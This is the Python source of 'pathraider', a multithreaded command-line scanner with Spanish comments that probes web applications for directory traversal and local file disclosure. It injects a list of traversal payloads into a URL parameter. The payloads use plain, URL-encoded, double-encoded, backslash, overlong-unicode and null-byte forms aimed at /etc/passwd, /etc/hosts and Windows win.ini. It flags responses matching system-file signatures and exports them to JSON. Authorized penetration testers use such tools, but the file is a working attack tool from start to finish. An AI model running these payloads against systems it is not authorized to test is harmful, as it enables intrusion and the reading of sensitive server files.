#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""pathraider – escaner de Local File Disclosure y Directory Traversal.

- Un objetivo (--url) o multiples desde archivo (--list).
- Inyeccion con marcador FUZZ o parametro configurable (--param).
- 132 rutas generadas desde 12 rutas base con encodings:
  plain, %2e%2e%2f, doble, backslash, unicode, null byte.
- Deteccion heuristica de contenido sensible.
- Escaneo concurrente con hilos.
- Exportacion a JSON.
"""

__version__ = "1.1.0"

import argparse
import json
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, List, Optional

import requests
from colorama import Fore, Style, init

init(autoreset=True)


# ─── Rutas y encodings ────────────────────────────────────────────────────

BASE_PATHS: List[str] = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../etc/hosts",
    "../../../etc/hosts",
    "../../../../etc/hosts",
    "../../windows/win.ini",
    "../../../windows/win.ini",
    "../../../../windows/win.ini",
    "../../windows/system32/drivers/etc/hosts",
    "../../../windows/system32/drivers/etc/hosts",
    "../../../../windows/system32/drivers/etc/hosts",
]


def expand_encodings(paths: List[str]) -> List[str]:
    result = list(paths)
    for path in paths:
        variants = [
            path.replace("../", "%2e%2e%2f"),
            path.replace("../", "%252e%252e%252f"),
            path.replace("../", "..%2f"),
            path.replace("../", "..\\"),
            path.replace("../", "..%5c"),
            path.replace("../", "..%c0%af"),
            path.replace("../", "%c0%ae%c0%ae%2f"),
            path.replace("../", ".//"),
            path + "%00",
            path + "%00.jpg",
        ]
        for v in variants:
            if v not in result:
                result.append(v)
    return result


DEFAULT_PATHS: List[str] = expand_encodings(BASE_PATHS)

UNIX_SIGNATURES: List[str] = [
    "root:x:0:0:",
    "/bin/bash",
    "/bin/sh",
    ":/home/",
]

WIN_SIGNATURES: List[str] = [
    "[extensions]",
    "[fonts]",
    "for 16-bit app support",
    "C:\\WINDOWS\\",
]


# ─── Banner ───────────────────────────────────────────────────────────────

def print_banner() -> None:
    print(Fore.CYAN + r"""
+------------------------------------------------------+
|                                                      |
|  ██████╗  ██████╗ ███████╗██╗  ██╗                |
|  ██╔══██╗██╔════╝ ██╔════╝██║  ██║                |
|  ██████╔╝███████╗█████╗  ███████║                |
|  ██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║                |
|  ██║     ╚██████╔╝███████╗██║  ██║                |
|  ╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝                |
|                                                      |
|  ██████╗  ██████╗ ██╗ █████╗  ██████╗        |
|  ██╔══██╗██╔══██╗██║██╔══██╗██╔════╝        |
|  ██████╔╝██████╔╝██║██║  ██║█████╗          |
|  ██╔═══╝ ██╔══██╗██║██║  ██║██╔══╝          |
|  ██║     ██║  ██║██║╚█████╔╝╚██████╗        |
|  ╚═╝     ╚═╝  ╚═╝╚═╝ ╚════╝  ╚═════╝        |
|                                                      |
|  LFD & Directory Traversal scanner  v{ver}        |
|  encodings: plain · %2e · doble · unicode · null   |
|  by theoffsecgirl                                  |
+------------------------------------------------------+
""".format(ver=__version__) + Style.RESET_ALL)


# ─── Build helpers ────────────────────────────────────────────────────

def build_targets(args: argparse.Namespace) -> List[str]:
    targets: List[str] = []
    if args.url:
        targets.append(args.url.strip())
    if args.list:
        with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
    clean: List[str] = []
    for t in targets:
        t = t.strip()
        if not t:
            continue
        if not t.startswith(("http://", "https://")):
            t = "http://" + t
        clean.append(t)
    if not clean:
        print(Fore.RED + "[!] No se han proporcionado objetivos validos." + Style.RESET_ALL)
        sys.exit(1)
    return list(dict.fromkeys(clean))


def load_paths(args: argparse.Namespace) -> List[str]:
    paths = list(DEFAULT_PATHS)
    if args.paths:
        try:
            with open(args.paths, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and line not in paths:
                        paths.append(line)
        except OSError as e:
            print(Fore.RED + "[!] No se pudo leer el archivo de rutas: {}" .format(e) + Style.RESET_ALL)
    return paths


def build_url(base: str, param_name: str, path: str) -> str:
    if "FUZZ" in base:
        return base.replace("FUZZ", path)
    parsed = urllib.parse.urlparse(base)
    query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    query[param_name] = path
    new_query = urllib.parse.urlencode(query, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def response_looks_interesting(text: str) -> bool:
    t = text[:5000]
    return (
        any(s in t for s in UNIX_SIGNATURES)
        or any(s in t for s in WIN_SIGNATURES)
        or ("root:" in t and "/bin" in t)
    )


# ─── Scanner ────────────────────────────────────────────────────────────────

def scan_single_request(
    session: requests.Session,
    url: str,
    timeout: int,
    verify: bool,
    headers: Dict[str, str],
    path: str,
    verbose: bool = False,
) -> Optional[dict]:
    try:
        resp = session.get(url, timeout=timeout, verify=verify, headers=headers, allow_redirects=True)
        if verbose:
            print(Fore.BLUE + "[*]" + Style.RESET_ALL + " {} -> {}".format(url, resp.status_code))
        if resp.status_code in (200, 206, 500, 403) and response_looks_interesting(resp.text):
            snippet = resp.text[:200].replace("\n", " ").replace("\r", " ")
            return {"url": url, "status": resp.status_code, "path": path, "snippet": snippet}
    except requests.RequestException as e:
        if verbose:
            print(Fore.YELLOW + "[!] Error en {}: {}".format(url, e) + Style.RESET_ALL)
    return None


def scan_target(
    base_url: str,
    paths: List[str],
    args: argparse.Namespace,
    session: requests.Session,
    headers: Dict[str, str],
) -> List[dict]:
    findings: List[dict] = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(
                scan_single_request,
                session,
                build_url(base_url, args.param, p),
                args.timeout,
                not args.insecure,
                headers,
                p,
                args.verbose,
            )
            for p in paths
        ]
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                findings.append(result)
                print(Fore.RED + "[+] Posible LFD/Traversal en" + Style.RESET_ALL + " " + result["url"])
                print("    path:    " + result["path"])
                print("    status:  " + str(result["status"]))
                print("    snippet: " + result["snippet"] + "\n")
    return findings


# ─── CLI ────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="pathraider – LFD & Directory Traversal scanner by theoffsecgirl"
    )
    parser.add_argument("-u", "--url",
                        help="URL objetivo. Puede contener FUZZ como marcador de inyeccion.")
    parser.add_argument("-L", "--list",
                        help="Archivo con lista de objetivos (uno por linea).")
    parser.add_argument("--paths",
                        help="Archivo con rutas de traversal personalizadas.")
    parser.add_argument("-p", "--param", default="file",
                        help="Parametro a usar sin FUZZ (default: file).")
    parser.add_argument("-t", "--timeout", type=int, default=5,
                        help="Timeout por peticion en segundos (default: 5).")
    parser.add_argument("-T", "--threads", type=int, default=10,
                        help="Hilos por objetivo (default: 10).")
    parser.add_argument("-A", "--agent",
                        default="Mozilla/5.0 (compatible; pathraider/{})".format(__version__),
                        help="User-Agent personalizado.")
    parser.add_argument("--insecure", action="store_true",
                        help="Desactivar verificacion TLS.")
    parser.add_argument("--json-output",
                        help="Archivo donde guardar resultados en JSON.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Modo verbose.")
    parser.add_argument("--version", action="version",
                        version="pathraider {}".format(__version__))
    args = parser.parse_args()
    if not args.url and not args.list:
        parser.error("Debes proporcionar --url o --list.")
    return args


# ─── Main ────────────────────────────────────────────────────────────────────

def main() -> None:
    print_banner()
    args = parse_args()

    targets = build_targets(args)
    paths   = load_paths(args)

    print(Fore.YELLOW + "[i] Rutas de prueba cargadas: {}" .format(len(paths)) + Style.RESET_ALL + "\n")

    headers = {"User-Agent": args.agent}
    session = requests.Session()
    all_findings: Dict[str, List[dict]] = {}

    for target in targets:
        print(Fore.CYAN + "[*] Escaneando:" + Style.RESET_ALL + " " + target)
        all_findings[target] = scan_target(target, paths, args, session, headers)

    total_vuln = sum(len(v) for v in all_findings.values())
    print("\n" + "-" * 60)
    print(Fore.GREEN + "[+] Escaneo completado." + Style.RESET_ALL)
    print("    Objetivos analizados  : {}".format(len(targets)))
    print("    Posibles LFD/Traversal: {}".format(total_vuln))

    if args.json_output:
        report = {
            "tool": "pathraider",
            "version": __version__,
            "generated_at": datetime.utcnow().isoformat() + "Z",
            "targets": all_findings,
        }
        try:
            with open(args.json_output, "w", encoding="utf-8") as fout:
                json.dump(report, fout, indent=2, ensure_ascii=False)
            print(Fore.GREEN + "[+] JSON guardado en: " + Style.RESET_ALL + args.json_output)
        except OSError as e:
            print(Fore.RED + "[!] No se pudo escribir el JSON: {}" .format(e) + Style.RESET_ALL)


if __name__ == "__main__":
    main()
